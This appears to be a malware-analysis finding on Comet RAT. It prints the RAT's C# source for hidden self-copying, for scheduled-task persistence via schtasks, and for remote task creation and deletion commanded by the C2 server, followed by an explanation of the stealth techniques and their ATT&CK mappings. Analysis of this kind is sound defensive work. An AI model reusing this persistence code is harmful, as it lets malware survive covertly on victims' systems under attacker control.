# Finding 5: Comet RAT - Configurable Schedule Persistence

## Metadata
- **Repository**: MalwareSourceCode-main
- **File Path**: `Win32/Win32.CometRAT.ab/Win32.CometRAT.ab/Stub/StubX/q.cs`
- **Language**: C# (Visual Basic .NET style)
- **Malware Family**: Comet RAT (Remote Access Trojan)

## Code Snippet

```csharp
if (Conversions.ToBoolean(CheckBox28))
{
    try
    {
        string userName = Environment.UserName;
        TextBox12.Text = TextBox12.Text.Replace("?", userName);
        if (!File.Exists(TextBox12.Text))
        {
            if (Operators.CompareString(Module1.x55, "", false) == 0)
            {
                File.Copy(Application.ExecutablePath, TextBox12.Text);
                File.SetAttributes(TextBox12.Text, FileAttributes.Hidden);
                
                // *** SCHEDULED TASK CREATION - CONFIGURABLE ***
                if (Conversions.ToBoolean(Module1.x56))
                {
                    // Minute-based schedule (Lines 1647)
                    Interaction.Shell("schtasks /create /sc minute /" + TextBox8.Text + " /tn " + TextBox13.Text + " /tr " + TextBox12.Text, (AppWinStyle)0, false, -1);
                }
                else
                {
                    // Daily schedule (Line 1651)
                    Interaction.Shell("SchTasks /Create /SC DAILY /TN " + TextBox13.Text + " /TR " + TextBox12.Text + " /" + TextBox8.Text, (AppWinStyle)0, false, -1);
                }
            }
            else
            {
                string userName2 = Environment.UserName;
                Module1.x55 = Module1.x55.Replace("?", userName2);
                Directory.CreateDirectory(Module1.x55);
                File.Copy(Application.ExecutablePath, TextBox12.Text);
                File.SetAttributes(TextBox12.Text, FileAttributes.Hidden);
                
                if (Conversions.ToBoolean(Module1.x56))
                {
                    Interaction.Shell("schtasks /create /sc minute /" + TextBox8.Text + " /tn " + TextBox13.Text + " /tr " + TextBox12.Text, (AppWinStyle)0, false, -1);
                }
                else
                {
                    Interaction.Shell("SchTasks /Create /SC DAILY /TN " + TextBox13.Text + " /TR " + TextBox12.Text + " /" + TextBox8.Text, (AppWinStyle)0, false, -1);
                }
            }
        }
    }
    catch (Exception ex3)
    {
        ProjectData.SetProjectError(ex3);
        Exception ex4 = ex3;
        ProjectData.ClearProjectError();
    }
}

// REMOTE COMMAND HANDLER - Lines 2960-3030
case "ononTask":
{
    TextB.Text = array[1];          // Task name
    TextBox8.Text = array[3];       // Schedule parameter
    TextBox12.Text = array[2];      // File path
    string text44 = array[5];       // Additional parameter
    string text45 = array[4];       // Schedule type
    
    string userName2 = Environment.UserName;
    TextBox12.Text = TextBox12.Text.Replace("?", userName2);
    Thread.Sleep(Conversions.ToInteger("100"));
    
    if (File.Exists(TextBox12.Text))
    {
        switch (text45)
        {
        case "1":  // Every N minutes
            Interaction.Shell("schtasks /create /sc minute /" + TextBox8.Text + " /tn " + TextB.Text + " /tr " + TextBox12.Text, (AppWinStyle)0, false, -1);
            break;
        case "2":  // Daily
            Interaction.Shell("SchTasks /Create /SC DAILY /TN " + TextB.Text + " /TR " + TextBox12.Text + " /" + TextBox8.Text, (AppWinStyle)0, false, -1);
            break;
        case "3":  // Monthly
            Interaction.Shell("SchTasks /Create /SC MONTHLY /" + TextBox8.Text + " /TN " + TextB.Text + " /TR " + TextBox12.Text + " /" + text44, (AppWinStyle)0, false, -1);
            break;
        case "4":  // Weekly
            Interaction.Shell("SchTasks /Create /SC WEEKLY /" + TextBox8.Text + " /TN " + TextB.Text + " /TR " + TextBox12.Text + " /" + text44, (AppWinStyle)0, false, -1);
            break;
        }
        break;
    }
    // If file doesn't exist, copy and create task
    File.Copy(Application.ExecutablePath, TextBox12.Text);
    File.SetAttributes(TextBox12.Text, FileAttributes.Hidden);
    // ... [same switch statement repeats]
    break;
}
case "ofofTask":  // Task deletion - Line 3015
    TextB.Text = array[1];
    Interaction.Shell("SCHTASKS /Delete /TN " + TextB.Text + " /f", (AppWinStyle)0, false, -1);
    break;
```

## Analysis

**What it does:**
Comet RAT implements a sophisticated, fully configurable scheduled task persistence mechanism that can be controlled remotely by the C2 server. The RAT supports multiple schedule types (minute, daily, weekly, monthly) and allows dynamic task creation, modification, and deletion.

**How it uses Windows Scheduled Tasks (T1053.005):**
The malware supports four different schedule types:

1. **Minute-based**: `/sc minute /mo N` - runs every N minutes
2. **Daily**: `/SC DAILY` - runs once per day
3. **Weekly**: `/SC WEEKLY` - runs weekly (with additional day parameters)
4. **Monthly**: `/SC MONTHLY` - runs monthly (with additional date parameters)

All tasks can be:
- Created with operator-specified task names
- Pointed to operator-specified file paths
- Configured with custom timing parameters
- Deleted remotely via the "ofofTask" command

**Evasion/Stealth Techniques:**
1. **Hidden file attribute**: Sets `FileAttributes.Hidden` on copied malware files
2. **Dynamic path substitution**: Replaces "?" with current username for path customization
3. **Remote configurability**: Operator can choose task name, schedule, and path to blend with target environment
4. **Hidden execution**: `AppWinStyle = 0` (VbHide)
5. **Directory creation**: Automatically creates necessary directories if they don't exist
6. **Error suppression**: All exceptions are silently caught and cleared

**Advanced Features:**
1. **Remote task management**: C2 server can dynamically create, modify, or delete tasks via "ononTask" and "ofofTask" commands
2. **Flexible scheduling**: Four different schedule types allow operator to choose appropriate persistence frequency
3. **File management**: Handles file copying, directory creation, and attribute setting automatically
4. **Conflict avoidance**: Checks if file exists before copying to avoid errors

**Operator Control:**
The remote command interface allows attackers to:
- Deploy persistence after initial compromise
- Adjust persistence timing based on environment
- Remove tasks to cover tracks during exfiltration
- Create multiple tasks with different schedules for redundancy

**MITRE ATT&CK Mapping:**
- **T1053.005**: Scheduled Task/Job: Scheduled Task (Primary - multiple variants)
- **T1059.003**: Command and Scripting Interpreter: Windows Command Shell
- **T1070.004**: Indicator Removal on Host: File Deletion (task deletion capability)
- **T1564.001**: Hide Artifacts: Hidden Files and Directories
- **T1105**: Ingress Tool Transfer (file copying)
